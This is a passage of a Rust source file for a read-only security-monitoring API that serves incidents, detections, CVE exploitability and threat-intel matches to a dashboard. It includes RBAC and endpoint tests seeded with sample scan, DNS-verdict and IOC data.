//! hookprobe-api — the Mission Control read-API (ADR 0001: Rust/Axum).
//!
//! Serves the REAL evidence graph (`crates/hookprobe-evidence`, SQLite) to the UI over plain HTTP
//! JSON + one SSE stream, ending the mock era one workspace at a time. **Read-only by construction**:
//! the DB handle is opened via `EvidenceGraph::open_readonly` (`SQLITE_OPEN_READ_ONLY` at the SQLite
//! open-flags layer, not just "a connection this crate promises not to write through"), so this
//! process can NEVER contend with or corrupt the `hookprobe-evidence.timer` writer service — see
//! `hookprobe_evidence::EvidenceGraph::open_readonly`'s doc comment for the full guarantee.
//!
//! Capability + mode awareness (the OS invariant "capabilities, not branches"): `/api/manifest`
//! exposes the signed Platform Manifest's capability grants + the device's deployment mode, straight
//! from disk, so the UI can render/grey-with-reason/hide without ever hardware-branching. See
//! `manifest_view::manifest_view_json`.
#![forbid(unsafe_code)]

pub mod engine_status;
pub mod manifest_view;

use axum::{
    body::Body,
    extract::{Path, Query, State},
    http::{header, Method, StatusCode},
    response::{
        sse::{Event, KeepAlive, Sse},
        Response,
    },
    routing::get,
    Router,
};
use futures_util::stream::{self, Stream};
use hookprobe_evidence::EvidenceGraph;
use hookprobe_rbac::{RbacState, RolePolicy, TokenStore, Verb};
use serde::Deserialize;
use serde_json::json;
use std::{
    convert::Infallible,
    path::{Path as StdPath, PathBuf},
    sync::Arc,
    time::{Duration, Instant},
};
use tokio::sync::Mutex;
use tower_http::cors::{Any, CorsLayer};

pub use manifest_view::manifest_view_json;

/// This whole API is read-only BY CONSTRUCTION (`EvidenceGraph::open_readonly`) — every route is a
/// `GET`, and `viewer` (the least-privileged role) already grants `view` across the workspaces this
/// API backs (observe/detect/investigate/intelligence/business — see `security/rbac/roles.yaml`).
/// So every route needs exactly the same verb: "read-only stays broad" (ADR 0008's own wording),
/// never a per-endpoint table to keep in sync by hand. Finer per-workspace verb-gating (e.g.
/// splitting `business`-workspace reads from `detect`-workspace reads) is roadmap, not built.
fn required_verb(_method: &Method, _path: &str) -> Verb {
    Verb::View
}

/// Shared, read-only application state.
///
/// `db` is one `tokio::sync::Mutex`-guarded `EvidenceGraph` (SQLite's `Connection` is `!Sync`, so
/// concurrent handlers need external synchronization to share it). A single connection with brief
/// lock hold-times is the right tradeoff for an edge dashboard's query volume — there is no write
/// contention to design around, because this process holds no write lock at all.
#[derive(Clone)]
pub struct AppState {
    pub db: Arc<Mutex<EvidenceGraph>>,
    pub manifest_path: Arc<PathBuf>,
    pub claim_path: Arc<PathBuf>,
    /// The directory the evidence DB lives in (`/var/lib/hookprobe` on a real device) — derived
    /// from `db_path`'s parent, never a separate CLI flag: every stream/status file this OS writes
    /// (`sigma-status.json`, `yara-status.json`, …) is a sibling of `evidence.db` by convention, so
    /// one path is the single source both need. See `engine_status::engines_json`.
    pub data_dir: Arc<PathBuf>,
    pub started: Instant,
    /// How often `/api/stream` polls the DB's watermark (`EvidenceGraph::poll_since`). Small on an
    /// edge device (seconds, not a firehose); tests use a short interval so they don't have to wait.
    pub sse_poll_interval: Duration,
    /// RBAC enforcement seam (ADR 0008 + ADR 0028): the role policy + bearer-token store this
    /// process was started with. Standalone-loopback callers never touch this at all (see
    /// `hookprobe_rbac`'s crate doc) — it only matters once a bearer token or a non-loopback peer
    /// shows up.
    pub rbac: Arc<RbacState>,
}

impl AppState {
    /// Open the evidence DB **read-only**. Fails loudly if the file doesn't exist / isn't a valid
    /// evidence DB — a read-API with no graph to serve should refuse to start, not silently serve
    /// empty responses forever.
    ///
    /// `rbac_tokens_path` is the ADR 0008 store's `tokens.json` (`/var/lib/hookprobe/rbac/` on a
    /// real device). Missing is fine — `TokenStore::load` degrades to an empty, fail-closed store,
    /// which never affects the standalone-loopback-no-token path (see `hookprobe_rbac::authorize`).
    pub fn open(
        db_path: &StdPath,
        manifest_path: PathBuf,
        claim_path: PathBuf,
        sse_poll_interval: Duration,
        rbac_tokens_path: &StdPath,
    ) -> anyhow::Result<Self> {
        let db = EvidenceGraph::open_readonly(db_path)?;
        let data_dir = db_path.parent().map(|p| p.to_path_buf()).unwrap_or_else(|| PathBuf::from("/var/lib/hookprobe"));
        let rbac = RbacState::new(RolePolicy::built_in(), TokenStore::load(rbac_tokens_path), required_verb);
        Ok(Self {
            db: Arc::new(Mutex::new(db)),
            manifest_path: Arc::new(manifest_path),
            claim_path: Arc::new(claim_path),
            data_dir: Arc::new(data_dir),
            started: Instant::now(),
            sse_poll_interval,
            rbac,
        })
    }
}

/// Build the router. Exposed as a free function (not private to `main.rs`) so tests can construct
/// it in-process — no real TCP bind, no separate server process — and drive it via `tower::ServiceExt::oneshot`.
pub fn build_router(state: AppState) -> Router {
    // Permissive CORS: the UI is a static-asset build served from the SAME edge device, but the dev
    // workflow (Astro dev server on a different port) and any future separate-origin console need
    // this read-only, unauthenticated-by-design API reachable cross-origin. Nothing here is a write.
    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any);
    let rbac = state.rbac.clone();

    Router::new()
        .route("/api/health", get(health))
        .route("/api/manifest", get(manifest_handler))
        .route("/api/incidents", get(incidents))
        .route("/api/incidents/{id}", get(incident_detail))
        .route("/api/incidents/{id}/timeline", get(incident_timeline))
        .route("/api/incidents/{id}/processes", get(incident_processes))
        .route("/api/detections", get(detections))
        .route("/api/devices", get(devices))
        .route("/api/flows", get(flows))
        .route("/api/pcaps", get(pcaps))
        .route("/api/reports", get(reports))
        .route("/api/reports/{id}", get(report_detail))
        .route("/api/verdicts/dns", get(verdicts_dns))
        .route("/api/verdicts/aegis", get(verdicts_aegis))
        .route("/api/qsecbit", get(qsecbit))
        .route("/api/exploitability", get(exploitability))
        .route("/api/vex", get(vex_document))
        .route("/api/intel", get(intel))
        .route("/api/evidence/graph", get(evidence_graph))
        .route("/api/evidence/stats", get(evidence_stats))
        .route("/api/engines", get(engines))
        .route("/api/stream", get(stream_sse))
        // RBAC (ADR 0008 + ADR 0028) runs BEFORE the outer CORS layer, so CORS stays outermost —
        // it still decorates a 401/403 deny response, and preflight OPTIONS is handled by it
        // without ever reaching the auth check.
        .layer(axum::middleware::from_fn_with_state(rbac, hookprobe_rbac::enforce_middleware))
        .layer(cors)
        .with_state(state)
}

// ---------------------------------------------------------------------------
// small response helpers — every query method below already returns a validated JSON STRING
// (see hookprobe-evidence); wrapping it as the response body directly avoids a pointless
// parse-then-reserialize round trip on every request (edge-cheap by construction).
// ---------------------------------------------------------------------------

fn raw_json(status: StatusCode, body: String) -> Response {
    Response::builder()
        .status(status)
        .header(header::CONTENT_TYPE, "application/json")
        .body(Body::from(body))
        .expect("building a response from a JSON string body cannot fail")
}

fn err_500(e: anyhow::Error) -> Response {
    raw_json(
        StatusCode::INTERNAL_SERVER_ERROR,
        json!({"error": e.to_string()}).to_string(),
    )
}

fn not_found(body: serde_json::Value) -> Response {
    raw_json(StatusCode::NOT_FOUND, body.to_string())
}

fn from_result(r: anyhow::Result<String>) -> Response {
    match r {
        Ok(s) => raw_json(StatusCode::OK, s),
        Err(e) => err_500(e),
    }
}

#[derive(Debug, Deserialize)]
struct LimitQuery {
    limit: Option<i64>,
}

#[derive(Debug, Deserialize)]
struct NodeQuery {
    node: String,
}

// ---------------------------------------------------------------------------
// handlers
// ---------------------------------------------------------------------------

async fn health(State(state): State<AppState>) -> Response {
    raw_json(
        StatusCode::OK,
        json!({
            "status": "ok",
            "version": env!("CARGO_PKG_VERSION"),
            "uptime_secs": state.started.elapsed().as_secs(),
            "read_only": true,
        })
        .to_string(),
    )
}

async fn manifest_handler(State(state): State<AppState>) -> Response {
    raw_json(
        StatusCode::OK,
        manifest_view_json(&state.manifest_path, &state.claim_path),
    )
}

async fn incidents(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_incidents(q.limit.unwrap_or(100)))
}

/// `GET /api/incidents/:id` — the incident's full evidence-graph drill-down: the AI-explanation
/// envelope (*why · confidence · evidence · model · related events*) + the attack-path subgraph
/// (nodes+edges). Reuses `EvidenceGraph::incident_detail` verbatim.
async fn incident_detail(State(state): State<AppState>, Path(id): Path<String>) -> Response {
    let db = state.db.lock().await;
    match db.incident_detail(&id) {
        Ok(Some(s)) => raw_json(StatusCode::OK, s),
        Ok(None) => not_found(json!({"error": "incident not found", "id": id})),
        Err(e) => err_500(e),
    }
}

/// `GET /api/incidents/:id/timeline` — the incident-story timeline (ts-ordered narrative across
/// detections/flows/responses/host artifacts) backing the Investigate workspace's timeline view.
/// `found:false` in `EvidenceGraph::incident_timeline`'s own JSON (an unknown incident id) maps to
/// a 404, same convention `incident_detail`/`evidence_graph` already use.
async fn incident_timeline(State(state): State<AppState>, Path(id): Path<String>) -> Response {
    let db = state.db.lock().await;
    match db.incident_timeline(&id) {
        Ok(s) => {
            let v: serde_json::Value = serde_json::from_str(&s).unwrap_or(serde_json::Value::Null);
            if v["found"] == false {
                not_found(json!({"error": "incident not found", "id": id}))
            } else {
                raw_json(StatusCode::OK, s)
            }
        }
        Err(e) => err_500(e),
    }
}

/// `GET /api/incidents/:id/processes` — the incident's host-layer process tree (walks
/// `spawned_by` edges) backing the Investigate workspace's process-tree view.
async fn incident_processes(State(state): State<AppState>, Path(id): Path<String>) -> Response {
    let db = state.db.lock().await;
    match db.incident_process_tree(&id) {
        Ok(s) => {
            let v: serde_json::Value = serde_json::from_str(&s).unwrap_or(serde_json::Value::Null);
            if v["found"] == false {
                not_found(json!({"error": "incident not found", "id": id}))
            } else {
                raw_json(StatusCode::OK, s)
            }
        }
        Err(e) => err_500(e),
    }
}

async fn detections(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.recent_detections(q.limit.unwrap_or(100)))
}

async fn devices(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_devices(q.limit.unwrap_or(200)))
}

async fn flows(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_flows(q.limit.unwrap_or(200)))
}

/// `GET /api/pcaps` — trigger-to-evidence pcap artifacts (roadmap D). Metal pentest (2026-07-17)
/// found the `list_pcaps` read path existed in the evidence crate but was never routed here — an
/// operator could not drill from a detection to its captured packets. Read-only, same shape as flows.
async fn pcaps(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_pcaps(q.limit.unwrap_or(200)))
}

/// `GET /api/reports` — the executive-report list (the MissionControl evidence-chain terminus).
async fn reports(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_reports(q.limit.unwrap_or(100)))
}

/// `GET /api/reports/:id` — one report's full drill-back-to-raw-evidence document.
async fn report_detail(State(state): State<AppState>, Path(id): Path<String>) -> Response {
    let db = state.db.lock().await;
    match db.report_detail(&id) {
        Ok(Some(s)) => raw_json(StatusCode::OK, s),
        Ok(None) => not_found(json!({"error": "report not found", "id": id})),
        Err(e) => err_500(e),
    }
}

/// `GET /api/verdicts/dns` — dnsXai DNS/DGA verdicts (Detection-class nodes, `category="dns_dga"`).
async fn verdicts_dns(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.detections_by_categories(&["dns_dga"], q.limit.unwrap_or(100)))
}

/// `GET /api/verdicts/aegis` — AEGIS Guard reflex + policy verdicts (`category` in
/// `aegis_reflex`/`aegis_guard`).
async fn verdicts_aegis(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.detections_by_categories(&["aegis_reflex", "aegis_guard"], q.limit.unwrap_or(100)))
}

/// `GET /api/qsecbit` — the Organism Status orb's backing data: the latest reading (the orb's
/// number) + a bounded history (the heartbeat sparkline / score-history chart).
/// `GET /api/exploitability` — the supply-chain exploitability surface (ADR 0024): the per-CVE
/// VEX status + SSVC decision the `hookprobe-exploit` pipeline computed from the bundled OSV/EPSS
/// snapshots and the signed Platform Manifest's capabilities. This is the REAL data that replaces
/// `ui/src/store/itlMock.ts`'s hard-coded CVE list in the Intelligence workspace: ordered
/// most-actionable first (act > attend > track > defer), with an honest KPI summary
/// (`{act, attend, affected, not_affected, under_investigation, total}`). Read-only.
async fn exploitability(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_exploitability(q.limit.unwrap_or(200)))
}

/// `GET /api/intel` — the Intelligence workspace's IOC/threat-intel surface (ADR 0027): real
/// `iocs` rows (highest-hit-count first) matched by `crates/hookprobe-hydra`'s bundled-feed
/// matcher against this device's own flow/application data, an honest type-breakdown summary, and
/// the most recent HYDRA-sourced detections. Deliberately does NOT duplicate the CVE/VEX surface —
/// `cve_lens` in the response just names `/api/exploitability` (ADR 0024), which already serves
/// that half; the Intelligence workspace calls both endpoints to render the full picture. Replaces
/// part of `ui/src/store/itlMock.ts`'s hard-coded data. Read-only.
async fn intel(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    from_result(db.list_intel(q.limit.unwrap_or(200)))
}

/// `GET /api/engines` — the Detect workspace's engine-status row (ADR 0026): REAL loaded-rule
/// counts / last-run data for Sigma + YARA (read from their own status files — see
/// `engine_status`'s doc), honestly labelled `"source": "mock"` for Suricata/AI Detection/
/// Behavioral (no backing engine exists in this workspace yet). Replaces part of
/// `ui/src/store/detectMock.ts`'s hard-coded `ENGINES` array, one engine at a time — never all
/// five at once, and never by fabricating numbers for the three still-mock ones.
async fn engines(State(state): State<AppState>) -> Response {
    raw_json(StatusCode::OK, engine_status::engines_json(&state.data_dir))
}

/// `GET /api/vex` — the signed OpenVEX document itself (the machine-readable, cosign-siblable
/// artifact), served verbatim from disk with its signature-presence disclosed. Path is
/// `$HOOKPROBE_VEX_PATH` or the on-device default `/var/lib/hookprobe/exploitability/vex.json`.
/// 404 (never a fabricated doc) until the first pipeline pass has produced one — honest about "not
/// yet generated" rather than serving an empty stub.
async fn vex_document() -> Response {
    let path = std::env::var("HOOKPROBE_VEX_PATH")
        .unwrap_or_else(|_| "/var/lib/hookprobe/exploitability/vex.json".to_string());
    let p = StdPath::new(&path);
    match std::fs::read_to_string(p) {
        Ok(body) => {
            let signed = p.with_extension("json.sig").exists()
                || StdPath::new(&format!("{path}.sig")).exists();
            let mldsa = StdPath::new(&format!("{path}.mldsa.sig")).exists();
            // The VEX is served as-is; the signature status is advertised via headers so a caller
            // can decide to fetch + verify the sidecars (the doc itself stays byte-identical to
            // what was signed — never re-serialized here).
            Response::builder()
                .status(StatusCode::OK)
                .header(header::CONTENT_TYPE, "application/json")
                .header("x-hookprobe-vex-signed", signed.to_string())
                .header("x-hookprobe-vex-mldsa-signed", mldsa.to_string())
                .body(Body::from(body))
                .expect("vex response")
        }
        Err(_) => not_found(json!({
            "error": "no VEX document yet — the exploitability pipeline has not run",
            "path": path
        })),
    }
}

async fn qsecbit(State(state): State<AppState>, Query(q): Query<LimitQuery>) -> Response {
    let db = state.db.lock().await;
    match db.list_qsecbit(q.limit.unwrap_or(100)) {
        Ok(s) => {
            let v: serde_json::Value = serde_json::from_str(&s).unwrap_or_else(|_| json!({"count": 0, "scores": []}));
            let latest = v["scores"]
                .as_array()
                .and_then(|a| a.first())
                .cloned()
                .unwrap_or(serde_json::Value::Null);
            raw_json(
                StatusCode::OK,
                json!({"latest": latest, "history": v["scores"], "count": v["count"]}).to_string(),
            )
        }
        Err(e) => err_500(e),
    }
}

/// `GET /api/evidence/graph?node=<id>` — "everything clickable": the evidence-graph subgraph
/// (nodes+edges) reachable from ANY node id, network or host layer, not only incidents. Reuses
/// `EvidenceGraph::attack_path` as-is (its recursive CTE seeds from whatever id it's given — it has
/// no incident-specific logic). 404s when the node id is unknown (the seed alone reaches nothing).
///
/// **Key rename (UI-agent-flagged, PLM audit):** `attack_path`'s own JSON literally names its
/// seed field `"incident"` — correct for its OTHER caller (`incident_detail`, where the seed
/// genuinely IS an incident id), but misleading HERE: this endpoint is a generic node-drill (a
/// device, flow, process, … id, not necessarily an incident). The response below carries the
/// seed under the canonical `"node"` key; `"incident"` is kept alongside, unchanged, ONLY as a
/// deprecated back-compat alias for any existing caller that already reads it — new code should
/// read `"node"`. `EvidenceGraph::attack_path` itself is left untouched (its `incident_detail`
/// caller is correct as-is; the task's own "keep unchanged" rule).
async fn evidence_graph(State(state): State<AppState>, Query(q): Query<NodeQuery>) -> Response {
    let db = state.db.lock().await;
    match db.attack_path(&q.node) {
        Ok(s) => {
            let mut v: serde_json::Value = serde_json::from_str(&s).unwrap_or(serde_json::Value::Null);
            let nodes = v["nodes"].as_array().cloned().unwrap_or_default();
            let no_edges = v["edges"].as_array().map(|e| e.is_empty()).unwrap_or(true);
            let seed_unlabeled = nodes
                .first()
                .and_then(|n| n["label"].as_str())
                .map(|l| l.is_empty())
                .unwrap_or(true);
            if nodes.len() <= 1 && no_edges && seed_unlabeled {
                not_found(json!({"error": "node not found", "node": q.node}))
            } else {
                if let Some(obj) = v.as_object_mut() {
                    obj.insert("node".to_string(), json!(q.node));
                }
                raw_json(StatusCode::OK, v.to_string())
            }
        }
        Err(e) => err_500(e),
    }
}

/// `GET /api/evidence/stats` — per-table node/edge counts + the retention/prune state (backend-audit
/// gap 1: `evidence.db` current on-disk size + the last `hookprobe-evidence-prune.timer` pass, via
/// `EvidenceGraph::graph_stats`'s `db_size_bytes`/`last_prune` fields) — an operator-visible "is
/// retention actually working" surface, not just a silent cron job (`hookprobe-evidence --stats`'s
/// CLI twin, over HTTP). Read-only (the same `graph_stats` query the CLI uses).
async fn evidence_stats(State(state): State<AppState>) -> Response {
    let db = state.db.lock().await;
    from_result(db.graph_stats())
}

/// `GET /api/stream` — the "live telemetry" SSE feed (MissionControl.md: "Living, not refreshing").
/// Polls `EvidenceGraph::poll_since` on `state.sse_poll_interval`; emits ONE `update` event per tick
/// that actually has new detections/incidents/qsecbit readings (never an empty tick) — cheap and
/// edge-friendly by design (no LISTEN/NOTIFY, no WAL tailing), matching the build brief's "poll the
/// DB's max watermark on an interval... keep it simple and edge-cheap". `axum`'s `KeepAlive` sends
/// its own periodic comment-pings independently, so idle connections still detect a dead peer.
async fn stream_sse(
    State(state): State<AppState>,
) -> Sse<impl Stream<Item = Result<Event, Infallible>>> {
    let interval = state.sse_poll_interval;
    let db = state.db.clone();
    // Start the watermark at "now" (the current max ts already in the graph) so a freshly connected
    // client only sees NEW activity from this point forward, never the entire backlog on connect.
    let initial_since = {
        let g = db.lock().await;
        g.poll_since(0.0).map(|(wm, _)| wm).unwrap_or(0.0)
    };

    let event_stream = stream::unfold((db, initial_since), move |(db, since)| async move {
        loop {
            tokio::time::sleep(interval).await;
            let polled = {
                let g = db.lock().await;
                g.poll_since(since)
            };
            let (new_wm, body) = match polled {
                Ok(v) => v,
                Err(_) => (since, String::new()), // a transient read error just skips this tick
            };
            if new_wm > since {
                let ev = Event::default().event("update").data(body);
                return Some((Ok(ev), (db, new_wm)));
            }
            // no new activity this tick — loop rather than emit an empty event.
        }
    });

    Sse::new(event_stream).keep_alive(KeepAlive::default())
}

#[cfg(test)]
mod tests {
    use super::*;
    use http_body_util::BodyExt;
    use hookprobe_evidence::EvidenceGraph as Evidence;
    use tower::ServiceExt; // for `Router::oneshot`

    /// Seed a temp evidence DB via the SAME writer path production uses (`EvidenceGraph::open` +
    /// its ingest methods), then hand back the read-only `AppState` the API actually runs on.
    fn seeded_state(tag: &str) -> (AppState, PathBuf) {
        let db_path = std::env::temp_dir().join(format!("hp-api-test-{tag}-{}.db", std::process::id()));
        std::fs::remove_file(&db_path).ok();
        {
            let w = Evidence::open(&db_path).unwrap();
            w.ingest_flow(r#"{"type":"conn","ts":1000.0,"src_ip":"203.0.113.7","src_port":54321,"dst_ip":"192.168.1.10","dst_port":22,"proto":"tcp","conn_state":"S0","orig_bytes":0,"resp_bytes":0}"#).unwrap();
            w.ingest_detection(r#"{"ts":1000.0,"rule_id":1000003,"rule_msg":"NAPSE Port Scan Detected","category":"port_scan","severity":2,"mitre":"T1046","src_ip":"203.0.113.7","dst_ip":"192.168.1.10","dst_port":22,"confidence":0.9}"#).unwrap();
            w.correlate_incident("203.0.113.7", "Port scan incident").unwrap();
            w.ingest_dns_verdict(r#"{"domain":"evil.example","verdict":"malicious","score":0.95,"reasons":["dga"]}"#).unwrap();
            w.ingest_aegis_verdict(r#"{"mode":"reflex","ip":"10.0.0.9","level":"SHADOW","score":0.7,"response":"shadow-ban"}"#).unwrap();
            w.ingest_qsecbit_score(r#"{"score":0.91,"band":"GREEN","drift":0.01,"qdrift":0.02,"p_attack":0.01,"decay":0.0,"maha_dist":0.2,"entropy_nats":1.1}"#).unwrap();
            // ADR 0024 exploitability findings — one act (reachable KEV), one not_affected (capability
            // not granted — the differentiator) so /api/exploitability serves real data, not itlMock.
            w.ingest_vex_finding(r#"{"cve":"CVE-2024-6387","component":"openssh","component_version":"9.6p1","summary":"regreSSHion","published":"2024-07-01","cvss":8.1,"epss":0.94,"kev":true,"status":"affected","justification":null,"impact_statement":"reachable","action_statement":"act now","ssvc":"act","ssvc_reason":"KEV+reachable","exploitation":"active","exposed":true,"fixed_version":"9.8p1"}"#).unwrap();
            w.ingest_vex_finding(r#"{"cve":"CVE-2024-1002","component":"onnxruntime","component_version":"1.17.0","summary":"onnx overflow","published":"2024-03-01","cvss":8.8,"epss":0.42,"kev":false,"status":"not_affected","justification":"vulnerable_code_not_in_execute_path","impact_statement":"edge_ai not granted","action_statement":"","ssvc":"defer","ssvc_reason":"not reachable","exploitation":"poc","exposed":false,"fixed_version":null}"#).unwrap();
            // ADR 0027 HYDRA IOC match — so /api/intel serves real data, not itlMock.
            w.ingest_ioc_match(r#"{"ts":1500.0,"rule_id":4000000001,"rule_msg":"HYDRA IOC match: 162.243.103.246 (ip, family=Emotet, source=abuse.ch) via dst_ip","category":"threat_intel","severity":3,"mitre":"T1071.001","src_ip":"10.66.0.20","dst_ip":"162.243.103.246","dst_port":8080,"confidence":0.9,"indicator":"162.243.103.246","ioc_type":"ip","ioc_family":"Emotet"}"#).unwrap();
        }
        let manifest_path = std::env::temp_dir().join("hp-api-test-no-manifest.json");
        let claim_path = std::env::temp_dir().join("hp-api-test-no-claim.json");
        let rbac_tokens_path = std::env::temp_dir().join("hp-api-test-no-rbac-tokens.json");
        let state = AppState::open(&db_path, manifest_path, claim_path, Duration::from_millis(30), &rbac_tokens_path).unwrap();
        (state, db_path)
    }

    async fn get(app: &Router, uri: &str) -> (StatusCode, serde_json::Value) {
        let req = axum::http::Request::builder().uri(uri).body(Body::empty()).unwrap();
        let resp = app.clone().oneshot(req).await.unwrap();
        let status = resp.status();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let v: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("{uri} did not return valid JSON ({e}): {}", String::from_utf8_lossy(&bytes))
        });
        (status, v)
    }

    /// RBAC (ADR 0008 + ADR 0028) proof #1 — the anti-self-lockout / standalone-permissive
    /// invariant: a request with NO `ConnectInfo` (exactly what `tower::ServiceExt::oneshot`
    /// in-process calls look like — the same shape every other test in this file already uses)
    /// and NO bearer token must serve every route, exactly as it did before this crate existed.
    /// This is the proof that adding RBAC never broke the dashboard/UI wiring for the standalone,
    /// no-account default.
    #[tokio::test]
    async fn rbac_standalone_loopback_with_no_identity_stays_fully_open() {
        let (state, db_path) = seeded_state("rbac-standalone");
        let app = build_router(state);

        for uri in ["/api/health", "/api/incidents", "/api/detections", "/api/devices", "/api/qsecbit"] {
            let (status, _) = get(&app, uri).await;
            assert_eq!(status, StatusCode::OK, "{uri} must stay open for the standalone, no-identity caller");
        }
        std::fs::remove_file(&db_path).ok();
    }

    /// RBAC proof #2 — a bearer token this API's token store doesn't know about is a hard 401, even
    /// though the SAME route is wide open with no token at all (proof #1) — enforcement genuinely
    /// activates the moment an identity is presented, it isn't just decorative.
    #[tokio::test]
    async fn rbac_an_unknown_bearer_token_is_rejected_even_on_a_read_only_route() {
        let (state, db_path) = seeded_state("rbac-unknown-token");
        let app = build_router(state);

        let req = axum::http::Request::builder()
            .uri("/api/incidents")
            .header(axum::http::header::AUTHORIZATION, "Bearer not-a-real-token")
            .body(Body::empty())
            .unwrap();
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
        std::fs::remove_file(&db_path).ok();
    }

    /// RBAC proof #3 — defense-in-depth: a caller whose peer address is OBSERVED non-loopback (a
    /// real TCP client, once this binary is bound beyond 127.0.0.1) with no bearer token is denied,
    /// never silently treated as trusted just because it also carries no identity. Exercised via
    /// axum's `ConnectInfo` extension the same way `main.rs`'s `into_make_service_with_connect_info`
    /// populates it on a real socket.
    #[tokio::test]
    async fn rbac_a_non_loopback_peer_with_no_token_is_denied() {
        use axum::extract::ConnectInfo;
        use std::net::SocketAddr;

        let (state, db_path) = seeded_state("rbac-non-loopback");
        let app = build_router(state);

        let remote: SocketAddr = "203.0.113.9:44444".parse().unwrap();
        let mut req = axum::http::Request::builder().uri("/api/incidents").body(Body::empty()).unwrap();
        req.extensions_mut().insert(ConnectInfo(remote));
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn health_and_manifest_endpoints_respond() {
        let (state, db_path) = seeded_state("health");
        let app = build_router(state);

        let (status, v) = get(&app, "/api/health").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["status"], "ok");
        assert_eq!(v["read_only"], true);

        // no manifest.json on this box -> the safe standalone default, never a 500.
        let (status, v) = get(&app, "/api/manifest").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["manifest_present"], false);
        assert_eq!(v["mode"], "standalone");

        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn exploitability_endpoint_serves_ranked_vex_ssvc_findings() {
        let (state, db_path) = seeded_state("exploit");
        let app = build_router(state);

        let (status, v) = get(&app, "/api/exploitability").await;
        assert_eq!(status, StatusCode::OK);
        let findings = v["findings"].as_array().unwrap();
        assert_eq!(findings.len(), 2);
        // most-actionable first: the reachable KEV (act) outranks the not_affected (defer).
        assert_eq!(findings[0]["cve"], "CVE-2024-6387");
        assert_eq!(findings[0]["ssvc"], "act");
        assert_eq!(findings[0]["exposed"], true);
        // the differentiator surfaces: not_affected with the capability-grounded justification.
        let na = findings.iter().find(|f| f["cve"] == "CVE-2024-1002").unwrap();
        assert_eq!(na["status"], "not_affected");
        assert_eq!(na["justification"], "vulnerable_code_not_in_execute_path");
        assert_eq!(na["ssvc"], "defer");
        // honest KPI rollup replaces itlMock's hard-coded counters.
        assert_eq!(v["summary"]["act"], 1);
        assert_eq!(v["summary"]["not_affected"], 1);

        // /api/vex 404s honestly when no document has been generated on this test box.
        std::env::set_var("HOOKPROBE_VEX_PATH", db_path.with_extension("vex-absent.json"));
        let (status, _) = get(&app, "/api/vex").await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        std::env::remove_var("HOOKPROBE_VEX_PATH");

        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn intel_endpoint_serves_real_ioc_hits_and_names_the_cve_lens() {
        let (state, db_path) = seeded_state("intel");
        let app = build_router(state);

        let (status, v) = get(&app, "/api/intel").await;
        assert_eq!(status, StatusCode::OK);
        let iocs = v["iocs"].as_array().unwrap();
        assert_eq!(iocs.len(), 1);
        assert_eq!(iocs[0]["indicator"], "162.243.103.246");
        assert_eq!(iocs[0]["ioc_type"], "ip");
        assert_eq!(iocs[0]["family"], "Emotet");
        assert_eq!(iocs[0]["hits"], 1);
        assert_eq!(v["summary"]["total_indicators"], 1);
        assert_eq!(v["summary"]["ip"], 1);
        let recent = v["recent_matches"].as_array().unwrap();
        assert_eq!(recent.len(), 1);
        assert_eq!(recent[0]["src_ip"], "10.66.0.20");
        // Intelligence renders BOTH lenses — this endpoint names the OTHER one rather than duplicating it.
        assert_eq!(v["cve_lens"], "/api/exploitability");

        std::fs::remove_file(&db_path).ok();
    }

    #[tokio::test]
    async fn incidents_detections_devices_flows_verdicts_qsecbit_serve_seeded_data() {
        let (state, db_path) = seeded_state("crud");
        let app = build_router(state);

        let (status, v) = get(&app, "/api/incidents").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["count"], 1);
        let incident_id = v["incidents"][0]["id"].as_str().unwrap().to_string();
        assert_eq!(v["incidents"][0]["title"], "Port scan incident");

        let (status, v) = get(&app, &format!("/api/incidents/{incident_id}")).await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["id"], incident_id);
        assert!(v["explanation"]["model"].is_null(), "no AI planner ran — must stay null, never fabricated");
        assert!(v["explanation"]["confidence"].as_f64().unwrap() > 0.0);
        assert!(!v["attack_path"]["nodes"].as_array().unwrap().is_empty());

        let (status, v) = get(&app, "/api/incidents/inc:does-not-exist").await;
        assert_eq!(status, StatusCode::NOT_FOUND);
        assert_eq!(v["error"], "incident not found");

        let (status, v) = get(&app, "/api/detections").await;
        assert_eq!(status, StatusCode::OK);
        assert!(v["count"].as_i64().unwrap() >= 1);

        let (status, v) = get(&app, "/api/devices").await;
        assert_eq!(status, StatusCode::OK);
        assert!(v["count"].as_i64().unwrap() >= 1);

        let (status, v) = get(&app, "/api/flows").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["count"], 1);

        let (status, v) = get(&app, "/api/verdicts/dns").await;
        assert_eq!(status, StatusCode::OK);
        assert_eq!(v["count"], 1);
        assert_eq!(v["detections"][0]["category"], "dns_dga");

